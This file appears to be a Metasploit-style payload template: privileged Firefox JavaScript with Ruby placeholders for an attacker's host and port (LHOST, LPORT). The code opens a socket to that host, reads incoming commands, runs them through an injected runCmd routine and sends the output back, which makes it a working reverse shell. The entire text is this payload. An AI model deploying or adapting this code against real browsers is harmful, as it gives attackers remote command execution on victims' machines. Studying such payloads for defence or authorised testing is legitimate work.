(function(){
  window = this;
  Components.utils.import("resource://gre/modules/NetUtil.jsm");
  var host = '#{datastore["LHOST"]}';
  var port = #{datastore["LPORT"]};
  var socketTransport = Components.classes["@mozilla.org/network/socket-transport-service;1"]
                          .getService(Components.interfaces.nsISocketTransportService);
  var socket = socketTransport.createTransport(null, 0, host, port, null);
  var outStream = socket.openOutputStream(0, 0, 0);
  var inStream = socket.openInputStream(0, 0, 0);
  var pump = Components.classes["@mozilla.org/network/input-stream-pump;1"]
                 .createInstance(Components.interfaces.nsIInputStreamPump);
  pump.init(inStream, -1, -1, 0, 0, true);
  #{read_until_token_source}
  var listener = {
    onStartRequest: function(request, context) {},
    onStopRequest: function(request, context) {},
    onDataAvailable: readUntilToken(function(data) {
      runCmd(data, function(err, output) {
        if (!err) outStream.write(output, output.length);
      });
    })
  };
  #{run_cmd_source}
  pump.asyncRead(listener, null);
})();